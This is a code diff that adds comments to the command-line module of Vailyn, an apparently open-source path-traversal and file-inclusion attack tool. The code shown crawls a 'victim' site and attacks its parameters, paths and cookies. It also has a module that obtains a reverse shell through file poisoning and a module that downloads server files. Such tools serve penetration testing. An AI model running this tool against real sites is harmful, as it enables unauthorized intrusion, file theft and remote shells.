@@ -83,8 +83,12 @@ filetree.create_node(color.O + "/" + color.END + color.RD, "root")
 
 def cli(parser, opt, args, shell=True) -> int:
     """
-    Vailyn's main - parse args, start attacks & print results
+    Vailyn's CLI interface.
+     - parse rest of args
+     - start attacks & print results
     """
+
+    # are all globally required arguments given?
     if (not (opt["victim"] and opt["attack"]) or
             (args.attack != 5 and not opt["phase2"]
                 and not opt["nosploit"])):
@@ -141,6 +145,8 @@ def cli(parser, opt, args, shell=True) -> int:
         """
         query mode (scan GET Parameter)
         """
+
+        # is a query parameter to attack specified?
         if not opt["param"]:
             parser.print_help()
             sys.exit(
@@ -180,6 +186,8 @@ def cli(parser, opt, args, shell=True) -> int:
         """
         POST mode (scan POST/Form Data)
         """
+
+        # is a POST data string specified?
         if not opt["post"]:
             parser.print_help()
             sys.exit(
@@ -194,6 +202,8 @@ def cli(parser, opt, args, shell=True) -> int:
             color.END + color.RD,
             color.END,
         ))
+
+        # is the POST string specified sytactically correct?
         post_data = args.post
         if "INJECT" not in post_data:
             parser.print_help()
@@ -222,6 +232,7 @@ def cli(parser, opt, args, shell=True) -> int:
             color.END,
         ))
     else:
+        # attack index not in range
         parser.print_help()
         sys.exit(
             "\n" + color.R + "[-]" + color.END + color.BOLD
@@ -237,6 +248,7 @@ def cli(parser, opt, args, shell=True) -> int:
     ))
     time.sleep(0.5)
 
+    # print current and original IP if using Tor
     if variables.tor:
         print("\n{0} [TOR]{1}{6} IP{1}{0}|{1}{5} {2} {1}{4}>{1} {3}".format(
                 color.RD, color.END, variables.initip, variables.torip,
@@ -246,10 +258,16 @@ def cli(parser, opt, args, shell=True) -> int:
     if args.attack == 5:
         crawlcookies = {}
         arjunjar = None
+        # load authentication cookie for crawling
         if cookiefile != "":
             arjunjar = cookie_from_file(cookiefile)
             crawlcookies = requests.utils.dict_from_cookiejar(arjunjar)
 
+        """
+        Crawler Phase 0:
+         - fetch all links belonging to target
+         - save in spider-phase0.txt
+        """
         print(
             "\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Link Spider\n".format(
                 color.RD, color.END,
@@ -262,6 +280,7 @@ def cli(parser, opt, args, shell=True) -> int:
         ua = variables.user_agents[
             random.randrange(0, len(variables.user_agents))
         ]
+
         process = CrawlerProcess(
             {"USER_AGENT": ua, "LOG_ENABLED": False}
         )
@@ -287,6 +306,12 @@ def cli(parser, opt, args, shell=True) -> int:
         linkTable.inner_heading_row_border = False
         print("{}{}{}".format(color.RD, linkTable.table, color.END))
 
+        """
+        Crawler Phase 1:
+         - enumerate all HTTP GET parameters for each link
+         - uses Arjun in lib/Arjun
+         - save in spider-phase1.json
+        """
         time.sleep(1)
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Param Enum (GET)\n".format(
             color.RD, color.END,
@@ -295,6 +320,12 @@ def cli(parser, opt, args, shell=True) -> int:
         time.sleep(0.5)
         siteparams = crawler_arjun(cookiefile=cookiefile)
         time.sleep(1)
+
+        """
+        Crawler Phase 2:
+         - attack every GET parameter of every page
+         - save in spider-phase2.json
+        """
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Query Analysis\n".format(
             color.RD, color.END,
         ))
@@ -303,6 +334,13 @@ def cli(parser, opt, args, shell=True) -> int:
         queryattack = crawler_query(
             siteparams, victim2, verbose, checkdepth, vlnfile, cookiefile,
         )
+
+        """
+        Crawler Phase 3:
+         - attack every page using the path vector
+         - duplicate paths only attacked once
+         - save in spider-phase3.json
+        """
         time.sleep(1)
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Path Analysis\n".format(
             color.RD, color.END,
@@ -312,6 +350,12 @@ def cli(parser, opt, args, shell=True) -> int:
         pathattack = crawler_path(
             victim2, verbose, checkdepth, vlnfile, cookiefile,
         )
+
+        """
+        Crawler Phase 4:
+         - attack every cookie found
+         - save in spider-phase4.json
+        """
         time.sleep(1)
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Cookie Analysis\n".format(
             color.RD, color.END,
@@ -321,6 +365,13 @@ def cli(parser, opt, args, shell=True) -> int:
         cookieattack = crawler_cookie(
             victim2, verbose, checkdepth, vlnfile, cookiefile,
         )
+
+        """
+        Crawler Phase 5:
+         - enumerate all HTTP POST parameters for each link
+         - uses Arjun in lib/Arjun
+         - save in spider-phase5.json
+        """
         time.sleep(1)
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Param Enum (POST)\n".format(
             color.RD, color.END,
@@ -329,6 +380,12 @@ def cli(parser, opt, args, shell=True) -> int:
         time.sleep(0.5)
         postparams = crawler_arjun(post=True, cookiefile=cookiefile)
         time.sleep(1)
+
+        """
+        Crawler Phase 6:
+         - attack every POST parameter of every page
+         - save in spider-phase6.json
+        """
         print("\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} POST Analysis\n".format(
             color.RD, color.END,
         ))
@@ -343,6 +400,9 @@ def cli(parser, opt, args, shell=True) -> int:
         duration = end_time - start_time - 12.0  # remove known sleeps
         readable_time = datetime.timedelta(seconds=duration)
 
+        """
+        Format & print results as tables
+        """
         print("\n\n{0}[Vailyn]{1} SCAN{2}|{4} Finished in {5}{3}\n".format(
             color.RD,
             color.END + color.RB,
@@ -419,6 +479,8 @@ def cli(parser, opt, args, shell=True) -> int:
         notify("Crawler finished scanning {} URLs.".format(
             len(variables.viclist),
         ))
+
+        # exit program
         return
 
     # fetch and select cookie for cookie mode
@@ -485,6 +547,8 @@ def cli(parser, opt, args, shell=True) -> int:
             message += " Select Payloads for Phase 2"
         if vlnysis:
             notify(message)
+
+        # select payloads for Phase 2
         selectedpayloads = select(
             foundpayloads, nosploit=args.nosploit,
         )
@@ -518,9 +582,14 @@ def cli(parser, opt, args, shell=True) -> int:
                 if variables.lfi:
                     selectedwrappers += variables.phase1_wrappers
 
+    # skip phase 2 if --nosploit specified
     if opt["nosploit"]:
         attack = False
 
+    """
+    ! selectedwrappers ALWAYS needs to contain the empty !
+    ! string for the base attack to get executed         !
+    """
     if not selectedwrappers:
         selectedwrappers = [""]
 
@@ -535,7 +604,15 @@ def cli(parser, opt, args, shell=True) -> int:
             color.RD, color.END,
         ))
         if variables.revshell:
+            """
+            RCE Module - LFI only.
+
+            Obtain a reverse shell through file poisoning
+            and PHP wrappers
+            """
             if is_windows:
+                # Vailyn cannot start a listener automatically on Windows
+                # TODO: add this as feature
                 lis = input(
                     "[?] Are you listening on {}".format(
                         variables.LISTENIP,
@@ -559,14 +636,24 @@ def cli(parser, opt, args, shell=True) -> int:
                         stdout=DEVNULL,
                         stderr=subprocess.STDOUT,
                     )
+
+            # select RCE techniques to use
             techniques = select_techniques()
             starting_time = time.time()
+
+            # start attack
             lfi_rce(
                 techniques, args.attack, args.victim, victim2, param,
                 cookie, selected, verbose, selectedpayloads, selectednullbytes,
                 selectedwrappers, cookiefile, post_data, depth,
             )
         else:
+            """
+            Leak Module - LFI & Path Traversal.
+
+            Retreive (opt. download) files on server
+            using file & directory dictionaries
+            """
             set_date()
             sdirlen = 0
             with open(args.phase2[2], "r") as f:
